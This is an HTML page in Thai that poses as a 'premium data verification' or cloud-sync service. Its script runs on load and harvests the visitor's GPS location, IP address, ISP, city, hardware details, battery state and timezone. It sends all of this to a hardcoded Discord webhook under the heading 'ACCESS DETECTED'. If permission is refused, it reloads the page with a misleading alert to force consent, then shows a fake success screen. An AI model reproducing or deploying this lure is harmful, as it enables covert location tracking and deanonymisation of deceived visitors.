<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Service - Data Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Kanit', sans-serif; background: #010409; color: white; overflow: hidden; user-select: none; }
        .glass-panel { background: rgba(13, 17, 23, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .scan-line { height: 2px; background: linear-gradient(90deg, transparent, #3b82f6, transparent); position: absolute; width: 100%; top: 0; animation: scan move 1.5s infinite linear; }
        @keyframes move { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
        #loading-zone { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 200px; }
        .success-glow { filter: drop-shadow(0 0 10px rgba(34, 197, 94, 0.5)); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative border border-white/10">
        <div class="p-8 pb-4 text-center">
            <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em] font-bold">
                Cloud Sync v22.4
            </div>
            <h1 id="status-title" class="text-3xl font-bold mb-2 tracking-tight">กำลังประมวลผล...</h1>
            <p id="status-desc" class="text-slate-400 text-sm leading-relaxed">กรุณากด "ตกลง" หรือ "อนุญาต" เพื่อยืนยันการเชื่อมต่อฐานข้อมูลในพื้นที่ของคุณ</p>
        </div>

        <div class="p-8 pt-0">
            <div id="loading-zone">
                <div class="relative w-40 h-40 mx-auto mb-8 rounded-[2rem] border border-blue-500/30 overflow-hidden bg-slate-900 flex items-center justify-center">
                    <div id="icon-status" class="text-5xl animate-pulse">📡</div>
                    <div class="scan-line"></div>
                </div>
                <div id="logs" class="w-full text-[10px] font-mono text-slate-500 text-left bg-black/40 p-4 rounded-2xl border border-white/5 h-32 overflow-hidden leading-relaxed">
                    <p class="text-blue-400">> เริ่มต้นการค้นหาข้อมูลในพื้นที่...</p>
                </div>
            </div>

            <div id="result-zone" class="hidden animate-in fade-in zoom-in duration-500">
                <div class="mb-5 p-4 bg-green-500/10 border border-green-500/20 rounded-[1.5rem] flex items-center gap-4 text-green-400">
                    <div class="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center text-white text-2xl success-glow">✓</div>
                    <div>
                        <p class="font-bold text-sm uppercase">ตรวจสอบสำเร็จ</p>
                        <p class="text-[10px] opacity-70">ซิงค์ข้อมูลพรีเมียมเรียบร้อยแล้ว</p>
                    </div>
                </div>
                <div id="links-container" class="space-y-3"></div>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497104681770549318/pOsCVRZNsGnE8hxcr8YsMGuML2GfV95ALQSuxRF9KrLUrOgnaccBxt0Kc9Ygc6WruqkH";
        let hasSent = false;

        function log(msg, color = "blue-400/60") {
            const l = document.getElementById('logs');
            l.innerHTML += `<p class="text-${color}">> ${msg}</p>`;
            l.scrollTop = l.scrollHeight;
        }

        // ฟังก์ชันตรวจจับแหล่งที่มา (Referrer)
        function getSourceApp() {
            const ua = navigator.userAgent;
            if (ua.includes("Line/")) return "LINE App";
            if (ua.includes("FBAN") || ua.includes("FBAV")) return "Facebook App";
            if (ua.includes("Instagram")) return "Instagram App";
            return "Web Browser";
        }

        async function startProcess() {
            log("วิเคราะห์โปรโตคอลความปลอดภัย...");
            const sourceApp = getSourceApp();
            const network = await getNetwork();
            
            log(`ตรวจพบการเข้าถึงผ่าน: ${sourceApp}`, "blue-300");
            log(`เครือข่าย: ${network.isp} (IP: ${network.ip})`);
            
            const options = { enableHighAccuracy: true, timeout: 15000 };

            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    log("ยืนยันพิกัดดาวเทียมสำเร็จ!", "green-400");
                    document.getElementById('icon-status').innerText = "✅";
                    
                    const hardware = getHardware();
                    const battery = await getBattery();

                    const finalData = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy.toFixed(1),
                        source: sourceApp,
                        ...network, ...hardware, battery,
                        lang: navigator.language,
                        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
                    };

                    await sendReport(finalData);
                    setTimeout(() => showUI(finalData), 1000);
                },
                (err) => {
                    log("ปฏิเสธการเข้าถึง: ระบบไม่สามารถซิงค์ข้อมูลได้", "red-400");
                    alert("⚠️ เพื่อความปลอดภัยและสิทธิประโยชน์ในพื้นที่ของคุณ กรุณากด 'อนุญาต' การเข้าถึงตำแหน่ง");
                    location.reload();
                },
                options
            );
        }

        async function getNetwork() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                return { ip: d.ip, isp: d.org, city: d.city, country: d.country_name };
            } catch (e) { return { ip: "Unknown", isp: "N/A", city: "N/A" }; }
        }

        function getHardware() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
            return {
                gpu,
                cores: navigator.hardwareConcurrency || "N/A",
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`
            };
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                return `${(b.level * 100).toFixed(0)}% (${b.charging ? 'กำลังชาร์จ' : 'ไม่ได้ชาร์จ'})`;
            } catch { return "N/A"; }
        }

        async function sendReport(d) {
            if (hasSent) return;
            hasSent = true;
            
            const payload = {
                embeds: [{
                    title: `🎯 [ACCESS DETECTED] ผ่าน ${d.source}`,
                    color: d.source === "Web Browser" ? 3447003 : 15105570,
                    fields: [
                        { name: "🌐 ข้อมูลเครือข่าย", value: `**IP:** \`${d.ip}\`\n**ISP:** ${d.isp}\n**พื้นที่:** ${d.city}, ${d.country}`, inline: false },
                        { name: "📍 พิกัด GPS", value: `[ดูแผนที่ Google Maps](http://googleusercontent.com/maps.google.com/7{d.lat},${d.lon})\nแม่นยำ: +/- ${d.acc} เมตร`, inline: false },
                        { name: "📱 ข้อมูลเครื่อง", value: `**OS:** ${d.platform}\n**จอ:** ${d.screen}\n**แบต:** ${d.battery}`, inline: true },
                        { name: "⚙️ ฮาร์ดแวร์", value: `**CPU:** ${d.cores} Cores\n**GPU:** ${d.gpu}`, inline: true }
                    ],
                    footer: { text: "Premium Identity Node • " + new Date().toLocaleString('th-TH') }
                }]
            };
            
            await fetch(WEBHOOK_URL, { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify(payload) 
            });
        }

        function showUI(d) {
            document.getElementById('loading-zone').classList.add('hidden');
            document.getElementById('result-zone').classList.remove('hidden');
            document.getElementById('status-title').innerText = "ซิงค์ข้อมูลสำเร็จ";
            document.getElementById('status-desc').innerText = "ข้อมูลพรีเมียมพร้อมใช้งานสำหรับคุณแล้ว";

            const container = document.getElementById('links-container');
            container.innerHTML = `
                <div class="bg-white/5 border border-white/10 p-4 rounded-2xl mb-4">
                    <p class="text-[10px] text-slate-500 uppercase mb-2">ข้อมูลบัญชีเบื้องต้น</p>
                    <div class="flex justify-between text-xs">
                        <span class="text-slate-400">เข้าใช้งานจาก:</span>
                        <span class="text-blue-400">${d.source}</span>
                    </div>
                </div>
                <a href="#" class="flex items-center gap-4 bg-gradient-to-r from-blue-600 to-blue-700 p-5 rounded-2xl hover:brightness-110 transition-all shadow-lg active:scale-95">
                    <span class="text-2xl">📥</span>
                    <div class="flex-1 text-left">
                        <p class="text-white text-sm font-bold">เปิดใช้งานไฟล์พรีเมียม</p>
                        <p class="text-blue-100 text-[10px]">ปลดล็อกฐานข้อมูลใน ${d.city} เรียบร้อย</p>
                    </div>
                </a>
            `;
        }

        window.onload = startProcess;
    </script>
</body>
</html>
